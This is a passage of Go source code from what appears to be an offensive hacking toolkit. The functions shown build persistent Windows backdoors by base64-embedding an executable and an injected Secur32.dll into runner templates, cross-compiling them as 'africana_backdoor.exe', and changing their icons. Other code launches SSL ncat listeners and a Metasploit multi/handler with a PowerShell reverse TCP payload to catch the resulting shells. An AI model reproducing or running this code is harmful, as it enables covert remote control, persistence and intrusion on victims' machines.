            userLport = "9999"
        }
        fmt.Printf(`LPORT => %s`, userLport)
        subprocess.Popen(`rlwrap ncat --ssl --ssl-key /root/.africana/certs/africana-key.pem --ssl-cert /root/.africana/certs/africana-cert.pem -lnvp %s`, userLport)

    case "2":
         BlackJack()

    case "3":
        userLhostIp, err := utils.GetDefaultIP()
        if err != nil {
            fmt.Println(bcolors.RED + "Error!!" + bcolors.ENDC + ": " + bcolors.BLUE + "Getting default " + bcolors.RED + "LhostIp ", err)
        }
        fmt.Println()
        subprocess.Popen(`ip address`)
        fmt.Printf(bcolors.UNDERL + bcolors.BOLD + "afr3" + bcolors.ENDC + " exploit(" + bcolors.RED + "c2/androids/androrat/set_LHOST_default/%s = %s%s", bcolors.ENDC, bcolors.ORANGE, userLhostIp + bcolors.ENDC + ")" + bcolors.GREEN + " ❯ " + bcolors.ENDC)
        scanner.Scan()
        userLhost := scanner.Text()
        if userLhost == "" {
            userLhost = userLhostIp
        }
        fmt.Printf(`LHOST => %s`, userLhostIp)
        fmt.Printf(bcolors.UNDERL + bcolors.BOLD + "afr3" + bcolors.ENDC + " exploit(" + bcolors.RED + "c2/androids/androrat/set_LPORT_default/%s = %s9999%s", bcolors.ENDC, bcolors.ORANGE, bcolors.ENDC + bcolors.ENDC + ")" + bcolors.GREEN + " ❯ " + bcolors.ENDC)
        scanner.Scan()
        userLport := scanner.Text()
        if userLport == "" {
            userLport = "9999"
        }
        fmt.Printf(`LPORT => %s`, userLport)
        subprocess.Popen(`msfconsole -x "use multi/handler;set payload windows/powershell_reverse_tcp_ssl; set LHOST %s; set LPORT %s; set ExitOnSession false; exploit -j"`, userLhostIp, userLport)
    default:
        utils.SystemShell(userInput)
    }
}

func MalwareDll() {
    ShikataGanai()
    dllFilePath := "/root/.africana/africana-base/exploits/payload_templates/injected_dlls/Secur32.dll"
    exeFilePath := "/root/.africana/output/malware_complete.exe"

    dllData, err := ioutil.ReadFile(dllFilePath)
    if err != nil {
        log.Fatalf("Failed reading binary file: %s", err)
    }

    exeData, err := ioutil.ReadFile(exeFilePath)
    if err != nil {
        log.Fatalf("Failed reading executable file: %s", err)
    }

    encodedExe := base64.StdEncoding.EncodeToString(exeData)
    encodedDll := base64.StdEncoding.EncodeToString(dllData)

    subprocess.Popen(`cp -r /root/.africana/africana-base/exploits/payload_templates/go_exploits/malware_runner_dll.go /root/.africana/output/malware_runner_dll.go`)
    filesToReplacements := map[string]map[string]string{
        "/root/.africana/output/malware_runner_dll.go": {
        `africanas`: encodedExe,
        `africanax`: encodedDll,
        },
    }
    utils.Editors(filesToReplacements)

    if err := os.Setenv("GOOS", "windows"); err != nil {
        log.Fatalf("Failed to set GOOS environment variable: %s", err)
    }
    if err := os.Setenv("GOARCH", "amd64"); err != nil {
        log.Fatalf("Failed to set GOARCH environment variable: %s", err)
    }

    runnerFilePath := "/root/.africana/output/malware_runner_dll.go"
    endMalwarePath := "/root/.africana/output/africana_backdoor.exe"
    fmt.Printf(bcolors.BLUE + "\nIntergrating Persistence Mechanisim: " + bcolors.ENDC + "in Malware!\n" + bcolors.DARKGREEN)
    buildCmd := "go build -v -x -o %s %s"

    formattedCmd := fmt.Sprintf(buildCmd, endMalwarePath, runnerFilePath)
    subprocess.Popen(formattedCmd)

    log.Printf(bcolors.BLUE + "\n\nPersistent BackDoor: " + bcolors.ENDC + "Saved at " + bcolors.RED + "%s", endMalwarePath + bcolors.ENDC)

    IconChanger()
    ListenerLauncher()
}

func MalwareReg() {
    ShikataGanai()

    exeFilePath := "/root/.africana/output/malware_complete.exe"

    exeData, err := ioutil.ReadFile(exeFilePath)
    if err != nil {
        log.Fatalf("Failed reading executable file: %s", err)
    }

    encodedExe := base64.StdEncoding.EncodeToString(exeData)

    subprocess.Popen(`cp -r /root/.africana/africana-base/exploits/payload_templates/go_exploits/malware_runner_reg.go /root/.africana/output/malware_runner_reg.go`)
    filesToReplacements := map[string]map[string]string{
        "/root/.africana/output/malware_runner_reg.go": {
        `africanas`: encodedExe,
        },
    }
    utils.Editors(filesToReplacements)

    if err := os.Setenv("GOOS", "windows"); err != nil {
        log.Fatalf("Failed to set GOOS environment variable: %s", err)
    }
    if err := os.Setenv("GOARCH", "amd64"); err != nil {
        log.Fatalf("Failed to set GOARCH environment variable: %s", err)
    }

    runnerFilePath := "/root/.africana/output/malware_runner_reg.go"
    endMalwarePath := "/root/.africana/output/africana_backdoor.exe"
    fmt.Printf(bcolors.BLUE + "\nIntergrating Persistence Mechanisim: " + bcolors.ENDC + "in Malware!\n" + bcolors.DARKGREEN)
    buildCmd := "go build -v -x -o %s %s"

    formattedCmd := fmt.Sprintf(buildCmd, endMalwarePath, runnerFilePath)
    subprocess.Popen(formattedCmd)

    log.Printf(bcolors.BLUE + "\n\nPersistent BackDoor: " + bcolors.ENDC + "Saved at " + bcolors.RED + "%s", endMalwarePath + bcolors.ENDC)

    IconChanger()
    ListenerLauncher()
}

func ListenerLauncher() {
    fmt.Println()
    fmt.Print(bcolors.BLUE + "[" + bcolors.GREEN + "*" + bcolors.BLUE + "] " + bcolors.ENDC + "Do you want to launch a Listener? " + bcolors.RED + "[y/n]" + bcolors.ENDC + ": " + bcolors.ENDC)
    scanner.Scan()
    userInput := scanner.Text()
    if userInput == "" {
        userInput = "y"
    }
    switch userInput {
    case "n":
        return
    case "y":
        fmt.Print(bcolors.BLUE + "[" + bcolors.GREEN + "*" + bcolors.BLUE + "] " + bcolors.ENDC + "Listener to launch? " + bcolors.BLUE + "1. " + bcolors.YELLOW + "tcp " + bcolors.BLUE + "2. " + bcolors.YELLOW + "https " + bcolors.ENDC + "or " + bcolors.BLUE + "0. " + bcolors.YELLOW + bcolors.ITALIC + "go back" + bcolors.ENDC + ": " + bcolors.ENDC)
        scanner.Scan()
        userInput := scanner.Text()
        if userInput == "" {
            userInput = "1"
        }
        switch userInput {
        case "0":
            return
        case "1":
            ListenerTcp()
        case "2":
            ListenerHttp()
        default:
            utils.SystemShell(userInput)
        }
    default:
        utils.SystemShell(userInput)
    }
}

func HoaxMalware() {
    ShikataGanai()
    IconChanger()
    ListenerLauncher()
}

func NoiseMakers() {
    MalwareDll()
}

func CodeBreakers() {
    MalwareReg()
}

